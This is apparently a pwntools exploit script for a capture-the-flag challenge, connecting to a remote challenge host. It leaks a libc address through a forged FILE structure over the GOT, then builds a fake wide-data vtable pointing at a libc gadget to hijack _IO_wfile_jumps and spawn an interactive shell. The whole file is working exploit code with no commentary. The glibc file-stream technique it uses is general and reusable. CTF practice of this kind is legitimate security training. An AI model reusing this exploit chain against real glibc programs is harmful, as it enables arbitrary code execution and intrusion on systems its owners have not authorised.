from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['konsole', '-e']

# p = process(["./ld-linux-x86-64.so.2", "--library-path", "./", "./chal_patched"])
# p = remote("localhost", 8080)
p = remote("tcp.ybn.sg", 11135)
context.log_level = 'debug'
# gdb.attach(p, "break *_IO_wdoallocbuf+55")

p.sendlineafter(B'> ', b'1')

p.recvuntil(b': ')
leak = int(p.recvline(), 16)

fsop = FileStructure()
fsop.flags = 0xfbad2480
fsop._IO_read_ptr = elf.got.puts
fsop._IO_read_end = elf.got.puts + 0x100
fsop._IO_read_base = elf.got.puts
fsop._lock = leak + 0x80
fsop.fileno = 3

# pause()
name_prefix = b'a' * 0x80 + b'\x00' * 8 + b'a' * (256 - 0x80 - 8)
payload = name_prefix + bytes(fsop)[:0xc0]
p.sendlineafter(B'> ', b'3')
p.sendafter(B': ', payload)

name = b'\x00' * 0xf0
p.sendlineafter(B'> ', b'3')
p.sendafter(B': ', payload)

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'')
# p.interactive()

libc.address = u64(p.recv(6).strip().ljust(8, b'\x00')) - libc.symbols['puts']
print(hex(libc.address))
print(hex(leak))

fake_wide_vtable = flat({
    0x68: libc.address + 0xbfb2f,
    0xe0: leak
}, length=0x100, filler=b'\x00')

fsop = FileStructure()
fsop.flags = b'        '
fsop.vtable = libc.symbols['_IO_wfile_jumps']
fsop._lock = leak + 0x80
fsop._wide_data = leak
fsop._IO_buf_base = 1

payload = fake_wide_vtable + bytes(fsop)

p.sendlineafter(b'> ', b'3')
p.sendafter(b': ', payload)

p.sendlineafter(b'> ', b'4')

p.interactive()
